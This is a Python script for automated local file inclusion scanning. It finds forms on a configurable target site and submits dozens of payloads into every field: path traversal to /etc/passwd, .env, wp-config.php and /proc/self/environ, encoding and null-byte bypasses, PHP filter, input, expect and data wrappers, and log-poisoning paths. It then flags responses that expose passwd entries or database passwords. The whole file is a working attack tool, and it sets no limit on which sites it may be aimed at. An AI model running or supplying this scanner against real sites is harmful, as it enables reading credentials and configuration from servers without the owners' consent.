import requests
from bs4 import BeautifulSoup
import urllib.parse
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# --- CONFIGURATION ---
TARGET_URL = "http://x.x.x.x"  # Target URL
TIMEOUT = 15  # Timeout in seconds (increased to bypass WAF delays)
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# --- COMPREHENSIVE LFI PAYLOADS ---
# Includes classic traversal, encoding bypasses, PHP wrappers, and log poisoning
LFI_PAYLOADS = [
    # --- Classic Path Traversal ---
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/passwd%00",

    # --- URL Encoding Bypass ---
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",  # Windows paths
    "..%5c..%5c..%5c..%5cetc%5cpasswd",

    # --- Double URL Encoding ---
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%255c..%255c..%255c..%255cetc%255cpasswd",

    # --- Null Byte Bypass ---
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/passwd\0",
    "/etc/passwd%00",
    "/etc/passwd\0",

    # --- UTF-8 Encoding Bypass ---
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",

    # --- Windows Path Traversal ---
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\boot.ini",
    "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",

    # --- PHP Wrappers (Source Code Disclosure) ---
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",

    # --- PHP Input Wrapper ---
    "php://input",
    "php://input%00",

    # --- Expect Wrapper ---
    "expect://id",
    "expect://ls",

    # --- Data Wrapper ---
    "data://text/plain;base64,SGVsbG8gV29ybGQh",
    "data://text/plain,<?php phpinfo();?>",

    # --- Log Poisoning (Common Log Files) ---
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../var/log/httpd/access_log",
    "../../../../../../../../var/log/apache/access.log",
    "../../../../../../../../usr/local/apache/logs/access_log",
    "../../../../../../../../usr/local/apache2/logs/access_log",
    "../../../../../../../../var/www/logs/access_log",

    # --- Configuration Files ---
    "../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../etc/php.ini",
    "../../../../../../../../etc/httpd/conf/httpd.conf",

    # --- Session Files ---
    "../../../../../../../../var/lib/php/sessions/sess_*",
    "../../../../../../../../tmp/sess_*",

    # --- Git/Env Files ---
    "../../../../../../../../.git/config",
    "../../../../../../../../.env",
    "../../../../../../../../composer.json",

    # --- Apache/Nginx Misconfigurations ---
    "/.htaccess",
    "/.htpasswd",
    "/server-status",

    # --- Web App Configs ---
    "../../../../../../../../var/www/html/config.php",
    "../../../../../../../../var/www/html/wp-config.php",
    "../../../../../../../../var/www/html/configuration.php",
    "../../../../../../../../var/www/html/settings.php",

    # --- Proc Filesystem ---
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../proc/version",
    "../../../../../../../../proc/cpuinfo",

    # --- Filter Bypass (Apache/Nginx) ---
    "/index.php?page=../../../../../../../../etc/passwd",
    "/index.php?file=../../../../../../../../etc/passwd",
    "/download.php?file=../../../../../../../../etc/passwd",
]

# --- FUNCTIONS ---
def build_target_url(url, action):
    """
    Builds a valid target URL from base URL and form action.
    Handles relative/absolute paths and ensures proper URL formatting.
    """
    if action.startswith('http'):
        return action
    if not url.endswith('/') and not action.startswith('/'):
        return f"{url}/{action}"
    return f"{url}{action}"

def is_lfi_successful(response, payload):
    """
    Checks if the LFI payload was successful by looking for specific patterns in the response.
    Returns True if indicators of successful LFI are found.
    """
    # Classic LFI indicators
    if "root:x:" in response.text and "passwd" in payload:
        return True
    if "Apache/2." in response.text and "apache2.conf" in payload:
        return True
    if "nginx/1." in response.text and "nginx.conf" in payload:
        return True
    if "PHP_VERSION" in response.text and "php://" in payload:
        return True
    if "base64" in response.text and "php://filter" in payload:
        return True
    if "GET /" in response.text and "access.log" in payload:
        return True
    if "[boot loader]" in response.text and "boot.ini" in payload:
        return True
    if "DB_USERNAME" in response.text or "DB_PASSWORD" in response.text:
        return True
    return False

def print_result(payload, is_vulnerable, response_snippet=None):
    """
    Prints results in a readable and colored format.
    Vulnerabilities are highlighted in red, safe tests in green.
    """
    if is_vulnerable:
        print(Fore.RED + f"[!] LFI VULNERABILITY CONFIRMED with: {payload}")
        if response_snippet:
            print(Fore.YELLOW + f"    [Response snippet] {response_snippet[:200]}...")
    else:
        print(Fore.GREEN + f"[-] No LFI detected with: {payload}")

def find_forms(url):
    """
    Finds all forms on the target page.
    Returns a list of form elements for further testing.
    """
    try:
        headers = {"User-Agent": USER_AGENT}
        r = requests.get(url, headers=headers, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        print(Fore.CYAN + f"\n[+] Found {len(forms)} forms on the page.")
        return forms
    except Exception as e:
        print(Fore.RED + f"[!] Error finding forms: {e}")
        return []

def test_form(form, url):
    """
    Extracts details from a form (action, method, inputs).
    Returns a dictionary with form details for testing.
    """
    form_details = {}
    action = form.attrs.get("action", "").strip()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    form_details['action'] = action
    form_details['method'] = method
    form_details['inputs'] = inputs
    return form_details

def test_lfi_in_form(form_details, url):
    """
    Tests LFI vulnerabilities in form fields.
    Sends each payload and checks for successful exploitation.
    """
    print(Fore.CYAN + "\n[+] Testing LFI in form...")
    target_url = build_target_url(url, form_details['action'])
    for payload in LFI_PAYLOADS:
        data = {input_tag['name']: payload for input_tag in form_details['inputs']}
        try:
            headers = {"User-Agent": USER_AGENT}
            if form_details['method'] == "post":
                r = requests.post(target_url, data=data, headers=headers, timeout=TIMEOUT, allow_redirects=False)
            else:
                r = requests.get(target_url, params=data, headers=headers, timeout=TIMEOUT, allow_redirects=False)

            if is_lfi_successful(r, payload):
                print_result(payload, True, r.text)
            else:
                print_result(payload, False)

        except requests.exceptions.RequestException:
            print(Fore.ORANGE + f"[-] Connection error with: {payload}")
            continue

# --- EXECUTION ---
if __name__ == "__main__":
    print(Fore.CYAN + f"[*] Starting LFI scan on: {TARGET_URL}")
    forms = find_forms(TARGET_URL)
    for form in forms:
        form_details = test_form(form, TARGET_URL)
        test_lfi_in_form(form_details, TARGET_URL)
    print(Fore.CYAN + "\n[*] LFI scan completed.")
